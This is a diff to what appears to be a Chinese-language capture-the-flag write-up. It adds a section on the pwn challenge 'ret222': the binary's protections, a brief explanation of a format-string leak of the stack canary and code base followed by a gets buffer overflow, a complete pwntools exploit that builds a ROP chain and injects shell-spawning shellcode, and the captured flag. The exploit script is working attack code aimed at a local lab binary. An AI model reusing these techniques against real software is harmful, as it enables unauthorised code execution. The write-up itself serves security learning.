@@ -93,7 +93,84 @@ r.interactive()
 
 ## ret222
 
-[待補]
+```
+Arch:     amd64-64-little
+RELRO:    Full RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      PIE enabled
+FORTIFY:  Enabled
+```
+
+### concept
+
+觀察到該程式保護全開，所以先找一下有沒有 format string 或 heap 相關的漏洞
+
+可以發現在 Show info 輸出 name 的時候有 format string 的漏洞
+
+![](https://i.imgur.com/f7SvZwn.png)
+
+而在 Save data 時使用 `gets` 造成 buffer overflow
+
+所以可以利用 format string leak 出 code base 和 canary，然後再利用 buffer overflow 做出 ROP 讀入 shellcode 到 name 上，最後再跳到 name 上即可 (程式最後結束時會將 name 後的一大塊 memory 權限設成 rwx)
+
+### exploit
+
+```python
+#!/usr/bin/env python
+
+from pwn import *
+
+r = process('./ret222')
+
+context.arch = 'amd64'
+
+def setname(data):
+    r.sendlineafter('>', '1')
+    r.sendafter(':', data)
+
+def showinfo():
+    r.sendlineafter('>', '2')
+    r.recvuntil(':')
+
+def savedata(data):
+    r.sendlineafter('>', '3')
+    r.sendlineafter(':', data)
+
+def ex():
+    r.sendlineafter('>', '4')
+
+setname("%23$p")
+showinfo()
+canary = int(r.recvuntil('*')[2:-1], 16)
+log.info(hex(canary))
+
+setname("%24$p")
+showinfo()
+base = int(r.recvuntil('*')[2:-1], 16) - 0xd40
+log.info(hex(base))
+
+name = base + 0x202020
+main = base + 0xc00
+gets = base + 0x908
+pop_rdi = base + 0xda3
+
+payload = 'a' * 136 + flat(canary, 'deadbeef', pop_rdi, name, gets, main)
+savedata(payload)
+ex()
+
+r.sendline(asm(shellcraft.sh()))
+
+payload = 'a' * 136 + flat(canary, 'deadbeef', name)
+savedata(payload)
+ex()
+
+r.interactive()
+```
+
+### flag
+
+```FLAG{YOU_ARE_REALLY_SMART!!!!!!}```
 
 ## rev1
 
